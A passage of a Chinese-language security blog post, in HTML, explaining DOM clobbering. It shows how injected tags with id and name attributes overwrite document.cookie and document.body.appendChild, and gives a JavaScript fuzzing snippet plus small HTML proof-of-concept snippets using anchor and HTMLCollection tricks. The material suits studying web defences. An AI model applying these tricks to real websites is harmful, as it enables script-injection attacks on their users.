src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;<code>document.cookie</code>&#x5DF2;&#x7ECF;&#x88AB;&#x6211;&#x4EEC;&#x7528; img &#x6807;&#x7B7E;&#x7ED9;&#x8986;&#x76D6;&#x4E86;</p><h3 id="Example-3-Overwrite2"><a href="#Example-3-Overwrite2" class="headerlink" title="Example 3 - Overwrite2"></a>Example 3 - Overwrite2</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x591A;&#x5C42;&#x8986;&#x76D6;&#x6389;&#x4E86;<code>document.body.appendChild</code>&#x65B9;&#x6CD5;&#x3002;</p><h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><p>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x53BB;&#x521B;&#x5EFA;&#x6216;&#x8005;&#x8986;&#x76D6; document &#x6216;&#x8005; window &#x5BF9;&#x8C61;&#x7684;&#x67D0;&#x4E9B;&#x503C;&#xFF0C;&#x4F46;&#x662F;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x4E3E;&#x7684;&#x4F8B;&#x5B50;&#x53EA;&#x662F;&#x5229;&#x7528;&#x6807;&#x7B7E;&#x521B;&#x5EFA;&#x6216;&#x8005;&#x8986;&#x76D6;&#x6700;&#x7EC8;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x6807;&#x7B7E;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElment</code>&#x5BF9;&#x8C61;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png" alt></p><p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x6765;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x66F4;&#x9700;&#x8981;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x4E3A;&#x4E00;&#x4E2A;&#x53EF;&#x63A7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x4EE5;&#x4FBF;&#x6211;&#x4EEC;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h3><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x6765;&#x8FDB;&#x884C; fuzz &#x5F97;&#x5230;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>toString</code>&#x65B9;&#x6CD5;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x6807;&#x7B7E;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Object</span>.getOwnPropertyNames(<span class="hljs-built_in">window</span>)</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.match(<span class="hljs-regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> <span class="hljs-built_in">window</span>[p])</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="hljs-built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E24;&#x79CD;&#x6807;&#x7B7E;&#x5BF9;&#x8C61;&#xFF1A;<code>HTMLAreaElement (&lt;area&gt;)</code>&amp; <code>HTMLAnchorElement (&lt;a&gt;)</code>&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x6807;&#x7B7E;&#x5BF9;&#x8C61;&#x6211;&#x4EEC;&#x90FD;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>href</code>&#x5C5E;&#x6027;&#x6765;&#x8FDB;&#x884C;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png" alt></p><h3 id="HTMLCollection"><a href="#HTMLCollection" class="headerlink" title="HTMLCollection"></a>HTMLCollection</h3><p>&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x662F;<code>x.y</code>&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x5462;&#xFF1F;&#x4E24;&#x5C42;&#x7ED3;&#x6784;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E0A;&#x8FF0;&#x7684;&#x529E;&#x6CD5;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&apos;1:hasaki&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x65E0;&#x8BBA;&#x7B2C;&#x4E00;&#x4E2A;&#x6807;&#x7B7E;&#x600E;&#x4E48;&#x7EC4;&#x5408;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x90FD;&#x53EA;&#x662F;<code>undefined</code>&#x3002;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x52A0;&#x5165;&#x5F15;&#x5165; name &#x5C5E;&#x6027;&#x5C31;&#x4F1A;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x6548;&#x679C;&#x3002;</p><p><code>HTMLCollection</code>&#x662F;&#x4E00;&#x4E2A;<code>element</code>&#x7684;&#x201C;&#x96C6;&#x5408;&#x201D;&#x7C7B;&#xFF0C;&#x5728;&#x6700;&#x65B0;&#x7684; <a href="https://dom.spec.whatwg.org/#interface-htmlcollection" target="_blank" rel="noopener">Dom &#x6807;&#x51C6;</a>&#x4E2D; IDL &#x63CF;&#x8FF0;&#x5982;&#x4E0B;&#xFF1A;</p><blockquote><p>[Exposed=Window, LegacyUnenumerableNamedProperties]<br>interface HTMLCollection {<br>  readonly attribute unsigned long length;<br>  getter Element? item(unsigned long index);<br>  getter Element? namedItem(DOMString name);<br>};</p></blockquote><p>&#x6587;&#x4E2D;&#x4E5F;&#x63D0;&#x5230;&#x4E86;</p><blockquote><p>&#x200B;    <code>HTMLCollection</code> <em>is a historical artifact we cannot rid the web of. While developers are of course welcome to keep using it, new API standard designers ought not to use it (use</em> <code>sequence</code> <em>in IDL instead).</em></p></blockquote><p>&#x5B83;&#x662F;&#x4E00;&#x79CD;&#x5386;&#x53F2;&#x4EA7;&#x7269;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x4ECA;&#x5929;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x53EA;&#x662F;&#x5BF9;&#x4E8E; API &#x6807;&#x51C6;&#x8BBE;&#x8BA1;&#x8005;&#x4E0D;&#x63A8;&#x8350;&#x518D;&#x4F7F;&#x7528;&#x3002;</p><p>&#x5173;&#x4E8E;&#x5B83;&#x7684;&#x7528;&#x6CD5;&#xFF1A;</p><blockquote><p>collection . <code>length</code></p><p>&#x200B;    Returns the number of <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> in the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>.</p><p>element = collection . <code>item(index)</code></p><p>element = collection[index]</p><p>&#x200B;    Returns the <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with index index from the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>. The <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> are sorted in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a>.</p><p>element = collection . <code>namedItem(name)</code></p><p>element = collection[name]</p><p>&#x200B;    Returns the first <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with <a href="https://dom.spec.whatwg.org/#concept-id" target="_blank" rel="noopener">ID</a> or name name from the collection.</p></blockquote><p>&#x8BA9;&#x6211;&#x4EEC;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>collection[name]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8C03;&#x7528;&#x5176;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5148;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;<code>HTMLCollection</code>&#xFF0C;&#x518D;&#x901A;&#x8FC7;<code>collection[name]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8C03;&#x7528;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:hasaki&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQ